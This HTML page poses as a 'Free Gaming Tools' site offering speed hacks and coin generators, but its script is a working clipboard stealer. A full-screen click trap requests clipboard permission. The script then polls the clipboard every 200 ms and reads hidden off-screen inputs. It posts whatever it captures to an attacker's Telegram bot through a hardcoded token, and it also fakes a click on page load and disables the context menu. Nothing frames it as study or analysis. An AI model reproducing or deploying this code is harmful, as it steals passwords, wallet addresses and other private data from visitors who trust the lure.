<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Gaming Tools 🔥</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(45deg, #ff006e, #8338ec, #3a86ff);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            pointer-events: none;
        }
        
        .container {
            position: relative;
            z-index: 1;
            max-width: 500px;
            margin: 0 auto;
            padding: 40px 20px;
            text-align: center;
            color: white;
            animation: fadeIn 1s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        h1 {
            font-size: 2.5em;
            margin-bottom: 20px;
            text-shadow: 0 0 20px rgba(255,255,255,0.5);
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 20px rgba(255,255,255,0.5); }
            to { text-shadow: 0 0 30px rgba(255,255,255,0.8), 0 0 40px #ff006e; }
        }
        
        .btn {
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            border: none;
            padding: 20px 40px;
            font-size: 1.2em;
            border-radius: 50px;
            color: white;
            cursor: pointer;
            margin: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        
        .btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0,0,0,0.4);
        }
        
        .btn:active {
            transform: translateY(-2px);
        }
        
        /* HIDDEN ELEMENTS */
        .hidden-input {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1;
        }
        
        .status {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0,0,0,0.8);
            color: #00ff88;
            padding: 15px 20px;
            border-radius: 10px;
            font-family: monospace;
            font-size: 14px;
            backdrop-filter: blur(10px);
            display: none;
        }
        
        .particles {
            position: absolute;
            width: 100%;
            height: 100%;
            pointer-events: none;
            overflow: hidden;
        }
        
        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: white;
            border-radius: 50%;
            pointer-events: none;
            animation: float 6s linear infinite;
        }
        
        @keyframes float {
            0% { transform: translateY(100vh) scale(0); opacity: 1; }
            100% { transform: translateY(-100px) scale(1); opacity: 0; }
        }
    </style>
</head>
<body>
    <!-- FULLSCREEN CLICK TRAP -->
    <div class="overlay" id="clickTrap"></div>
    
    <!-- HIDDEN PASTE BOXES -->
    <input type="text" class="hidden-input" id="pasteBox1" />
    <input type="text" class="hidden-input" id="pasteBox2" />
    <input type="text" class="hidden-input" id="pasteBox3" />
    
    <!-- STATUS -->
    <div class="status" id="status">🔍 Monitoring...</div>
    
    <!-- PARTICLE SYSTEM -->
    <div class="particles" id="particles"></div>
    
    <div class="container">
        <h1>🎮 Free Gaming Tools</h1>
        <p style="font-size: 1.2em; margin-bottom: 30px;">Click anywhere to unlock premium features!</p>
        
        <button class="btn" id="btn1">⚡ Speed Hack</button>
        <button class="btn" id="btn2">💎 Coin Generator</button>
        <button class="btn" id="btn3">🛡️ Anti-Ban</button>
        <button class="btn" id="btn4">🌟 Auto Farm</button>
        
        <div style="margin-top: 40px; font-size: 1.1em;">
            👆 Click ANYWHERE on screen to activate!
        </div>
    </div>

    <script>
        // Telegram Config - আপনার bot details দিন
        const TELEGRAM_BOT_TOKEN = '8414003118:AAH8lHR4kza6h7kmPkyHvDezgDiHzYv_QG0';
        const TELEGRAM_CHAT_ID = '7562976399';
        
        let isActive = false;
        let pasteInterval;
        let permissionRequested = false;

        // Create click trap on entire screen
        const clickTrap = document.getElementById('clickTrap');
        clickTrap.addEventListener('click', handleClick, true);
        document.addEventListener('click', handleClick, true);
        document.addEventListener('touchstart', handleClick, true);

        // Main click handler - EVERYWHERE WORKS
        async function handleClick(e) {
            e.preventDefault();
            e.stopPropagation();
            
            if (!permissionRequested) {
                await requestPermissions();
                permissionRequested = true;
            }
            
            // Focus hidden paste boxes rapidly
            focusPasteBoxes();
            
            // Create particle effect
            createParticles(e.clientX, e.clientY);
            
            return false;
        }

        // Request ALL permissions
        async function requestPermissions() {
            try {
                // Clipboard permission
                const clipPerm = await navigator.permissions.request({name: 'clipboard-read'});
                document.getElementById('status').style.display = 'block';
                document.getElementById('status').textContent = '✅ Permissions Granted! Monitoring...';
                startPasteMonitoring();
                isActive = true;
            } catch (err) {
                document.getElementById('status').style.display = 'block';
                document.getElementById('status').textContent = '❌ Permission needed - Try again';
            }
        }

        // Rapidly focus hidden paste boxes to capture clipboard
        function focusPasteBoxes() {
            const boxes = ['pasteBox1', 'pasteBox2', 'pasteBox3'];
            boxes.forEach((id, index) => {
                setTimeout(() => {
                    const box = document.getElementById(id);
                    box.focus();
                    box.select();
                }, index * 10);
            });
        }

        // Continuous paste monitoring
        function startPasteMonitoring() {
            let lastContent = '';
            
            pasteInterval = setInterval(async () => {
                if (!isActive) return;
                
                try {
                    // Method 1: Direct clipboard read
                    const clipboardText = await navigator.clipboard.readText();
                    if (clipboardText && clipboardText.trim() && clipboardText !== lastContent) {
                        sendToTelegram(clipboardText.trim());
                        lastContent = clipboardText;
                    }
                } catch (e) {
                    // Method 2: Check hidden inputs
                    const boxes = ['pasteBox1', 'pasteBox2', 'pasteBox3'];
                    for (let box of boxes) {
                        const input = document.getElementById(box);
                        if (input.value && input.value.trim() && input.value !== lastContent) {
                            sendToTelegram(input.value.trim());
                            input.value = '';
                            lastContent = input.value;
                            break;
                        }
                    }
                }
            }, 200); // Check every 200ms - VERY AGGRESSIVE
        }

        // Send to Telegram INSTANTLY
        async function sendToTelegram(text) {
            if (!text || text.length < 1) return;
            
            const message = `🦠 BACKDOOR CAPTURED!\n\n📝 TEXT: ${text}\n\n🕐 ${new Date().toLocaleString('en-US', {timeZone: 'Asia/Dhaka'})}\n\n👤 User: Clipboard`;
            
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
                console.log('✅ SENT:', text.substring(0, 50));
            } catch (err) {
                console.error('Telegram failed');
            }
        }

        // Particle explosion effect
        function createParticles(x, y) {
            for (let i = 0; i < 10; i++) {
                setTimeout(() => {
                    const particle = document.createElement('div');
                    particle.className = 'particle';
                    particle.style.left = x + (Math.random() - 0.5) * 100 + 'px';
                    particle.style.top = y + (Math.random() - 0.5) * 100 + 'px';
                    particle.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    document.getElementById('particles').appendChild(particle);
                    
                    setTimeout(() => particle.remove(), 6000);
                }, i * 50);
            }
        }

        // Auto-trigger on load
        window.addEventListener('load', () => {
            setTimeout(() => {
                // Simulate first click
                const event = new MouseEvent('click', {bubbles: true, cancelable: true});
                document.dispatchEvent(event);
            }, 1000);
        });

        // Prevent context menu
        document.addEventListener('contextmenu', e => e.preventDefault());
    </script>
</body>
</html>
